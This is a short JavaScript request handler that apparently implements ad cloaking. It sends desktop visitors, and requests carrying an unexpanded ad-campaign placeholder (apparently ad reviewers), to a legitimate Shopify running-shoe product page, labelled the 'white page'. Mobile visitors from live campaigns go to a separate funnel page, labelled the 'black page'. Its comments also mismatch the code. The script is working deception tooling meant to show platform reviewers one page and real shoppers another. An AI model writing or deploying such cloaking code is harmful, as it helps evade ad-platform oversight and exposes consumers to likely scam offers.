export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://run-ottawa.myshopify.com/collections/asics/products/asics-woens-gel-nimbus-24-tamarack-ottawa-race-weekend-edition";
    const blackPageURL = "https://oVehJVcMYn.myfunnelish.com/2d0a3b75-f50e-42ce-a89a-857e42a19261-1739812548644231-1741029753086206";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }
